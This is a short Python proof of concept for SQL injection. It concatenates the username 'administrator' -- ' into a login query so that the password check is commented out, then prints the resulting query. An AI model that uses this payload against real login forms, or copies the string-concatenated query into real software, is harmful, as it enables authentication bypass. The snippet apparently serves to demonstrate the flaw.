# Server side PoC

username = "administrator' -- "
password = 'any'
query = "SELECT * FROM users WHERE username='" + username + "' AND password = '" + password + "';"

print(query) # SELECT * FROM users WHERE username='administrator' -- AND password='any';
